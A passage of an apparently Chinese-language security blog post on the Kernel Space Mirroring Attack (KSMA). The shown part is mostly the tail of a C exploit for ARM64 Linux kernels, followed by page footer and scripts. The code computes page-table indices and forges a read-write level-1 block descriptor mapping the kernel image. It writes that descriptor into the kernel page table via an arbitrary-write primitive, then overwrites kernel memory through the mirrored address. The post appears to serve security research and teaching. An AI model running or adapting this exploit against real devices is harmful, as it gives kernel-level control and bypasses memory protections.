class="comment">+-------------------------------------------------&gt; [63] TTBR0/1</span></span><br><span class="line"><span class="comment">* 解析 vaddr 获取在页表中各种数值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_vaddr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> ttrb0 = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> poffset = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> L0_index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> L1_index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> L2_index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> L3_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ttrb0 = (vaddr &amp; <span class="number">0x8000000000000000</span>) &gt;&gt; <span class="number">63</span>;</span><br><span class="line">  poffset = (vaddr &amp; <span class="number">0x0000000000000fff</span>);</span><br><span class="line">  L0_index = (vaddr &amp; <span class="number">0x0000ff8000000000</span>) &gt;&gt; <span class="number">39</span>;</span><br><span class="line">  L1_index = (vaddr &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>;</span><br><span class="line">  L2_index = (vaddr &amp; <span class="number">0x000000003fe00000</span>) &gt;&gt; <span class="number">21</span>;</span><br><span class="line">  L3_index = (vaddr &amp; <span class="number">0x00000000001ff000</span>) &gt;&gt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[%s] vaddr = 0x%lx\n"</span>, __func__, vaddr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[%s] ttbr%d \n"</span>, __func__, ttrb0);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[%s] poffset = 0x%x\n"</span>, __func__, poffset);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[%s] L0_index = 0x%x L1_index = 0x%x L2_index = 0x%x L3_index = 0x%x\n"</span>,</span><br><span class="line">  __func__, L0_index, L1_index, L2_index, L3_index);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* vaddr 是内核内存的空洞区域，伪造其 L1 pagetable 中 d_block 表项</span></span><br><span class="line"><span class="comment">* 以下 bits 位的具体信息要参考 armv8 的手册 D4-1791</span></span><br><span class="line"><span class="comment">* 1 Gb = 0x40000000 Byte</span></span><br><span class="line"><span class="comment">* 0x40000000</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fake_dblock_in_level1_page_table</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kimg_phys_addr, <span class="type">unsigned</span> <span class="type">long</span> L1_table_start_addr, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> fake_d_block = <span class="number">0l</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> fake_d_block_addr = <span class="number">0l</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算伪造 vaddr 的L1 页表项位置</span></span><br><span class="line">  <span class="type">int</span> L1_index = <span class="number">0</span>;</span><br><span class="line">  L1_index = (vaddr &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>;</span><br><span class="line">  fake_d_block_addr = L1_table_start_addr + L1_index * <span class="number">0x8</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"L1_inde = 0x%x fake_d_block_addr = 0x%lx\n"</span>, L1_index, fake_d_block_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// d_block 中的内容，主要是修改 AP[2:1], 修改为读写属性</span></span><br><span class="line">  <span class="comment">// bit[1:0]</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000001</span>); <span class="comment">// Y</span></span><br><span class="line">  <span class="comment">// bit[11:2] lower block attributes</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000800</span>); <span class="comment">// nG, bit[11] Y</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000400</span>); <span class="comment">// AF, bit[10] Y</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000200</span>); <span class="comment">// SH, bits[9:8]</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000040</span>); <span class="comment">// AP[2:1], bits[7:6]</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000020</span>); <span class="comment">// NS, bit[5] Y</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0000000000000010</span>); <span class="comment">// AttrIndx[2:0], bits[4:2]</span></span><br><span class="line">  <span class="comment">// bit[29:12] RES0</span></span><br><span class="line">  <span class="comment">// bit[47:30] output address</span></span><br><span class="line">  fake_d_block = fake_d_block | (kimg_phys_addr &amp; <span class="number">0x0000ffffc0000000</span>);</span><br><span class="line">  <span class="comment">// bit[51:48] RES0</span></span><br><span class="line">  <span class="comment">// bit[63:52] upper block attributes, [63:55] ignored</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0010000000000000</span>); <span class="comment">// Contiguous, bit[52]</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0020000000000000</span>); <span class="comment">// PXN, bit[53]</span></span><br><span class="line">  fake_d_block = fake_d_block | (<span class="number">0x0040000000000000</span>); <span class="comment">// XN, bit[54]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[fake] vaddr = 0x%lx\n"</span>, vaddr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[fake] fake_d_block_addr = 0x%lx --&gt; 0x%016lx\n"</span>, fake_d_block_addr, fake_d_block);</span><br><span class="line"></span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  write_at_address_pipe((<span class="type">void</span>*)fake_d_block_addr, &amp;fake_d_block, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"write errno = %d %s\n"</span>, errno , strerror(errno));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_addr_directly</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> addr = <span class="number">0xffffffc200000000</span> + <span class="number">0x20000000</span> + <span class="number">0x80000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"0x%lx --&gt; 0x%lx\n"</span>, addr, *(<span class="type">unsigned</span> <span class="type">long</span> *) addr);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> *) addr = <span class="number">0x100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"0x%lx --&gt; 0x%lx\n"</span>, addr, *(<span class="type">unsigned</span> <span class="type">long</span> *) addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">  disable_addr_limit();</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kimage_phys_addr = <span class="number">0x20000000</span>; <span class="comment">// 内核镜像加载的起始物理地址 memstart_addr 值</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> L1_table_start_addr = <span class="number">0xffffffc00007d000</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> fake_kernel_vaddr = <span class="number">0xffffffc000000000</span>; <span class="comment">// 0xffffffc200000000</span></span><br><span class="line">  fake_dblock_in_level1_page_table(kimage_phys_addr, L1_table_start_addr, fake_kernel_vaddr);</span><br><span class="line"></span><br><span class="line">  test_addr_directly();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> KSMA - Kernel Space Mirroring Attack</li>
+        <li><strong>Author:</strong> henry</li>
+        <li><strong>Created at
+                :</strong> 2025-02-10 21:42:44</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-02-10 21:46:28
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://henrymartin262.github.io/2025/02/10/KSMA/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/netlink/">#netlink</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/02/10/ebpf_study/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">ebpf Basic Knowledge</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">KSMA - Kernel Space Mirroring Attack</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#KSMA"><span class="nav-text">KSMA</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux-page-table-layout"><span class="nav-text">linux page table layout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#block-entry%E6%9E%84%E9%80%A0%E6%A8%A1%E7%89%88"><span class="nav-text">block entry构造模版</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
